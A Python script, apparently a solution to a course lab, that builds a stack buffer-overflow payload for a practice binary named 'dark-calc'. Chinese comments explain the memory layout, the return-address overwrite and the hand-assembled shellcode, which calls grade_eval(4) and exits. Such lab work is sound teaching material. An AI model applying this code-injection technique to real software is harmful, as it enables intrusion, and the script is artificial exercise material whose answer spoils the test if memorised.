#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

目标：让 dark-calc 执行注入在"栈空间"里的机器码，调用内部函数 grade_eval(4)，
打印 "Hope A will be your grade!"，然后干净退出（exit 0）。

为什么栈上可以执行代码？
  dark-calc 由 __wrap_main 把 rsp 固定到 0x721000801000，这块 8MB 区域是
  init_fixed_stack() 用 mmap(PROT_READ|WRITE|EXEC, MAP_FIXED) 申请的，
  所以栈既固定、又可执行；input() 里的 expression[] 就在 0x721000800fd0。

内存布局（相对 expression）：
  偏移 0..11   注入的机器码前半段
  偏移 12..23  填充（这段会被 grade_eval 的局部变量和 printf 的栈帧覆盖，
               所以代码不能放在这里"返回之后还要执行"的位置）
  偏移 24..31  覆盖 input() 的返回地址 -> 指回偏移 0
  偏移 32..38  第二段机器码（位于 0x721000800ff0，高于 grade_eval 用到的栈，
               不会被破坏），由前半段的 jmp 跳过来执行 exit(0)

机器码：
  6a 04              push 4
  5f                 pop  rdi
  b8 87 1a 40 00     mov  eax, 0x401a87   ; grade_eval
  ff d0              call rax
  eb 14              jmp  0x721000800ff0   ; 跳到第二段
  --- 第二段 ---
  31 ff              xor  edi, edi
  6a 3c              push 0x3c
  58                 pop  rax            ; 60 = exit
  0f 05              syscall
"""
import struct
import sys

STACK_EXPR = 0x721000800FD0   # input() 的 expression[]（固定栈）

STAGE1 = bytes.fromhex(
    "6a04"            # push 4
    "5f"              # pop rdi
    "b8871a4000"      # mov eax, 0x401a87
    "ffd0"            # call rax
    "eb14"            # jmp 0x721000800ff0
)
STAGE2 = bytes.fromhex(
    "31ff"            # xor edi, edi
    "6a3c"            # push 0x3c
    "58"              # pop rax
    "0f05"            # syscall
)

payload = STAGE1 + b"\x90" * (24 - len(STAGE1))
payload += struct.pack("<Q", STACK_EXPR)   # 返回地址指回注入的代码
payload += STAGE2

sys.stdout.buffer.write(payload + b"\n")
